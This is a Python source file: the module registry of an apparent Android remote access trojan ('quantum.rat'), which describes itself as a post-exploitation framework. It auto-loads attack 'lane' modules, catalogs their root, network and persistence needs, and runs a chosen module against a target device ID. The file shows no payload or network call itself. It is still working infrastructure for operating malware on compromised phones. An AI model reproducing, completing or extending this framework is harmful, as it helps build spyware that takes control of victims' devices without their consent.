"""Post-exploitation module registry — auto-imports all lane modules."""
from __future__ import annotations

import importlib
import os
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from quantum.rat.modules.base import Module, ModuleResult


class ModuleRegistry:
    """Registry of all post-exploitation modules."""

    def __init__(self):
        self._modules: Dict[str, Module] = {}
        self._load_all()

    def _load_all(self):
        """Auto-import all lane modules."""
        import os
        import sys
        lanes_dir = os.path.dirname(__file__) + '/lanes'
        for fname in sorted(os.listdir(lanes_dir)):
            if fname.endswith('_full.py') and not fname.startswith('__'):
                mod_name = fname[:-3]
                try:
                    mod = importlib.import_module('quantum.rat.modules.lanes.' + mod_name)
                    # Find all Module subclasses in this module
                    lane_letter = mod_name.split('_')[1].upper()
                    base_class_name = 'Lane%sModule' % lane_letter
                    for attr_name in dir(mod):
                        attr = getattr(mod, attr_name)
                        if isinstance(attr, type) and issubclass(attr, Module) and attr is not Module and attr.__name__ != base_class_name:
                            instance = attr()
                            self._modules[instance.name] = instance
                except Exception as e:
                    print('Failed to load %s: %s' % (mod_name, e))

    def get(self, name: str) -> Optional[Module]:
        return self._modules.get(name)

    def list_all(self) -> List[str]:
        return sorted(self._modules.keys())

    def list_by_lane(self, lane: str) -> List[str]:
        return [m for m in self._modules if m.startswith(lane)]

    def count(self) -> int:
        return len(self._modules)


# Global registry
_registry = ModuleRegistry()


def get_registry() -> ModuleRegistry:
    return _registry


def register_module(name: str, module: Module):
    _registry._modules[name] = module


# Aliases expected by rat/__init__.py
register = register_module
get_module = _registry.get
get_modules = _registry.list_all
get_modules_by_lane = _registry.list_by_lane
load_all_modules = lambda: None  # Already loaded in __init__

async def run_module(device_id: str, module_name: str, args: dict = None) -> ModuleResult:
    """Run a module by name on a device."""
    module = _registry.get(module_name)
    if not module:
        return ModuleResult(ok=False, error=f"Module {module_name} not found")
    return module.run(device_id, args)


def execute_module_sync(device_id: str, module_name: str, args: dict = None) -> ModuleResult:
    """Synchronous wrapper for run_module."""
    import asyncio
    return asyncio.run(run_module(device_id, module_name, args))


# Decorators for module requirements
def require_root(cls):
    cls.requires_root = True
    return cls


def require_adb(cls):
    return cls


def require_a11y(cls):
    return cls


def require_admin(cls):
    return cls


def require_network(cls):
    cls.requires_network = True
    return cls


def require_hardware(cls):
    return cls


def get_device_platform(device_id: str) -> str:
    return "android"


def get_module_catalog() -> Dict[str, Dict[str, Any]]:
    """Get catalog of all modules with metadata."""
    return {name: {"name": name, "requires_root": mod.requires_root, "requires_persist": mod.requires_persist, "requires_network": mod.requires_network} for name, mod in _registry._modules.items()}


def validate_module(name: str) -> bool:
    return _registry.get(name) is not None


# Argument helpers
def arg_string(default: str = "") -> Dict[str, Any]:
    return {"type": "string", "default": default}


def arg_int(default: int = 0) -> Dict[str, Any]:
    return {"type": "int", "default": default}


def arg_float(default: float = 0.0) -> Dict[str, Any]:
    return {"type": "float", "default": default}


def arg_bool(default: bool = False) -> Dict[str, Any]:
    return {"type": "bool", "default": default}


def arg_list(default: List = None) -> Dict[str, Any]:
    return {"type": "list", "default": default or []}


def arg_enum(choices: List[str], default: str = "") -> Dict[str, Any]:
    return {"type": "enum", "choices": choices, "default": default}


def arg_file(default: str = "") -> Dict[str, Any]:
    return {"type": "file", "default": default}
